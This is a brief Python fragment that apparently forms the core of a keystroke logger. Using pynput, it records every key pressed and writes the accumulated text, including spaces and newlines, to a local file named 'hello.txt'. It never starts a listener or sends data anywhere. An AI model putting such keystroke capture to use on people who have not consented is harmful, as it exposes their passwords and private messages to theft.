from pynput import keyboard


class Listener:
    word = []

    def on_press(self, key):
       Listener.word.append(key)
       with open('hello.txt', 'w') as f:
          for c in Listener.word:
            try:
                f.write(c.char)
            except AttributeError:
                if c == keyboard.Key.space:
                    f.write(" ")
                elif c == keyboard.Key.enter:
                    f.write("\n")
                else:
                    f.write(str(c))
            
           
